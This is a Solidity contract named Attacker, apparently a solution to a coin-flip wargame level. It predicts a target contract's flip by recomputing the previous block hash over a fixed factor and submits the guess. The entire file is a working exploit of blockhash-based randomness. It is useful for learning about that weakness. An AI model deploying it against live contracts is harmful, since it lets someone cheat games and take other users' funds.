// SPDX-License-Identifier: MIT

pragma solidity >=0.8.2 <0.9.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract Attacker {
    address coinFlipAddress;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlipAddress) {
        coinFlipAddress = _coinFlipAddress;
    }

    function cheatFlip() public returns (bool) {
        return ICoinFlip(coinFlipAddress).flip(getPredict());
    }

    function getPredict() internal view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;

        return coinFlip == 1;
    }
}